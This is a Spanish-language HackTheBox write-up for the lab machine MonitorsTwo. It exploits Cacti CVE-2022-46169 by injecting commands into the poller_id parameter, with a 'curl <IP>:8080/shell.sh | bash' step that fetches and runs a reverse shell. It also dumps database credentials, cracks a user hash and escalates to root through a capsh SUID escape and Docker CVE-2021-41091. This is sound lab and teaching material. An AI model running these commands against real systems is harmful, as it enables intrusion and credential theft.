---
layout: default
title: MonitorsTwo
parent: HackTheBox
grand_parent: Writeups
---

# MonitorsTwo
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---
Descubriremos que el sitio web hace uso de Cacti el cual tiene una version vulnerable a Command Injection que conduce a un Unauthenticated RCE, conseguiremos una rev shell en un contenedor en el cual descubriremos un archivo el cual usaremos para lekear las credenciales de un usuario, y para le escalada a root explotaremos el CVE-2021-41091
{:.lead}

## Enumeracion

Iniciamos con un escaneo con el comando

```nmap -sS -n -Pn --open -p- 10.10.11.211```

Donde le indicamos que con:

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora escanearemos los puertos 22, 80 buscando la version y servicio y demas informacion:

```sudo nmap -sCV -p22,80 10.10.11.211```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
```

No tenemos muchas informacion relevante, mas que en el puerto 80, vemos que por el titulo HTTP nos dice que hay un login: ```http-title: Login to Cacti```

Una vez en el sitio web podemos ver el login:

![](/assets/img/monitorsTwo/1.png)

(Les puedo adelantar que no es necesario hacer fuzzing de directorios ni otras cosas)

## CVE-2022-46169 - Command injection

Abajo del apartado de inicio de sesion nos dice que esta usando la version 1.2.22 de Cacti, una busqueda rapida de lo que es Cacti, me arroja que es una aplicacion web dedicada al monitoreo de red, para detectar fallas y supervisar el trafico web.

Como tenemos una version, siempre es bueno buscar para ver si hay vulnerabilidades disponibles, podemos ver que existe la CVE ```CVE-2022-46169``` que es una Command injection con la que conseguiremos un RCE. 

Al realizar una busqueda, tenemos que la vulnerabilidad reside en el archivo ```remote_agent.php``` el cual podemos acceder sin autenticacion, pero si intentamos acceder a el desde el URL: ```http://10.10.11.211/remote_agent.php```, nos saldra algo como esto:

![](/assets/img/monitorsTwo/2.png)

Leyendo un poco mas de la vulnerabilidad, para que nos deje acceder, dedemos agregar el encabezado ```X-Forwarded-For``` con la direccion de localhost

Una vez que podamos acceder al recurso, en la funcion ```poll_for_data()``` es donde existe el command injection:

```php
function poll_for_data() {
	global $config;

	$local_data_ids = get_nfilter_request_var('local_data_ids');
	$host_id        = get_filter_request_var('host_id');
	$poller_id      = get_nfilter_request_var('poller_id');
	$return         = array();

	$i = 0;

	if (cacti_sizeof($local_data_ids)) {
		foreach($local_data_ids as $local_data_id) {
			input_validate_input_number($local_data_id, 'local_data_id');

			$items = db_fetch_assoc_prepared('SELECT *
				FROM poller_item
				WHERE host_id = ?
				AND local_data_id = ?',
				array($host_id, $local_data_id));
			// ...
			if (cacti_sizeof($items)) {
				foreach($items as $item) {
					switch ($item['action']) {
					// ...
					case POLLER_ACTION_SCRIPT_PHP: /* script (php script server) */
						// ...
						$cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);
						// ...
```

Cuando se llama ```poll_for_data()``` se recuperan algunos parámetros de la peticion, si el ```action``` de ```poller_item``` entra el case ```POLLER_ACTION_SCRIPT_PHP```, la función ```proc_open``` ejecuta un script PHP

Y uno de los parametros es ```poller_id```, y se recupera a través de la función ```get_filter_request_var()```, si buscan esa funcion en google, se daran cuenta que perimte insertar cadenas arbitrarias, esta variable de ```poller_id``` se inserta luego en la cadena que se le pasa a proc_open, por lo que nosotros podemos indicarle que ejecute cualquier otra cosa en ```poller_id```, lo que conduce a una vulnerabilidad de inyección de comandos.

Al buscar en google podemos encontrar un par de exploits, usare este: [https://github.com/sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

Si vemos un poco el codigo:

```python
    url = f'{args.target}/remote_agent.php'
    params = {'action': 'polldata', 'host_id': host_id,
              'poller_id': payload, 'local_data_ids[]': local_data_ids}
    headers = {'X-Forwarded-For': '127.0.0.1'}
```

Vemos como en el parametro ```poller_id``` le esta adjuntando nuestro payload, que es esto declarado mas aca arriba: ```payload = f'; /bin/sh -c "{cmd}"'```, 

Solo queda ejecutar el exploit asi: ```python3 CVE-2022-46169.py http://10.10.11.211 -c "curl <tu_IP>:8080/shell.sh | bash"```

Si quieren hacer una explotacion manual, apunten a este recurso:

```/remote_agent.php?action=polldata&poller_id=;bash -c '<comando>'```

Y ya nos llego la rev shell:

![](/assets/img/monitorsTwo/3.png)


## Escalada de Docker

Ahora buscaremos binarios con permisos SUID: ```find / -perm -u=s -type f 2>/dev/null```

Podemos ver el binario: ```/sbin/capsh```

Si haces una busqueda en GFTObins encontramos que nos podemos hacer root: [](https://gtfobins.github.io/gtfobins/capsh/#suid)

```
www-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --
./capsh --gid=0 --uid=0 --
whoami 
root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Sin embargo, no nos servira para conseguir ninguna flag, ya que estamos dentro de un contenedor, a este punto decidi usar linpeas para ver si hay otro archivo interesante, y me arrojo que existe uno que se llama ```/entrypoint.sh```.

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```
Y tenemos la capacidad de ejecutar el comando: ```mysql --host=db --user=root --password=root cacti -e "consulta"```, no hace falta indicarle la base de datos ya que ya se esta usando, y es la de nombre ```cacti```, ahora mostraremos todas las tablas:

```mysql --host=db --user=root --password=root cacti -e "show tables"```

Las tablas de nuestro interes son estas:

```
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
```
Empezare a ver los datos de la primera tabla:

```mysql --host=db --user=root --password=root cacti -e "select * from user_auth"```

Aun que se vea extraño, hemos conseguido usuarios y el hash de sus contraseñas

![](/assets/img/monitorsTwo/4.png)

Les adelando que la unica que podemos crackear sera la de Marcus y esta cifrada con bcrypt, pueden usar John o Hashcat

**usr:** marcus

**pass:** funkymonkey

Ya tenemos la primera flag

```bash
marcus@monitorstwo:~$ cat user.txt 
a93ad02d6adb6a980368dad17b1*****
```

## Escalada

### CVE-2021-41091 

De nuevo ejecute linpeas, y me llamo la atencion una interfaz de red que corresponde a docker:

```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:73:b5:33:00  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Como no tenemos permisos para listar contenedores ni hacer operaciones con ellos, decidi ver si habia vulnerabilidades en la version que docker que esta corriendo en la maquina (```20.10.5```)

Encontre que hay una vulnerabilidad adyacente a docker: [https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076](https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076)

Otra forma de saber que existe una vulnerabilidad es por que linpeas nos muestra dos rutas donde puede que hayan correos:

```
4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus
4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

Al leerlo, vemos que nos dice que existen varias vulnerabilidades:

```
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Como estamos contra un docker entonces veremos la ultima

La vulnerabilidad se aprovecha de Moby Docker Engine, el directorio ```/var/lib/docker```, contiene subdirectorios con permisos insuficientes, donde basicamente se pueden ejectuar binarios  con permisos SUID en los contendores para poder moverse a travez del sistema.

De hecho si mostramos el espacio del disco con ```df -h``` podemos ver que tenemos varios directorios interesantes que se encuetran desde la ruta ```/var/lib/docker```:

![](/assets/img/monitorsTwo/5.png)

Para aprovecharnos de esto, desde la sesion que conseguimos con la rev shell (www-data que escalamos a root), le asignaremos permisos SUID a /bin/bash, despues ingresaremos a esta ruta

```
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

La cual corresponde a una de las que sacamos con el comando df -h, luego ingresamos el directorio ```/bin```, y te puedes dar cuenta como tiene permisos SUID, ahora solo queda poner ```./bash -p``` y ya somos root

```
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
b24ba43b32faf36aa02f70b2079*****
bash-5.1#
```

Eso ha sido todo, gracias por leer ❤
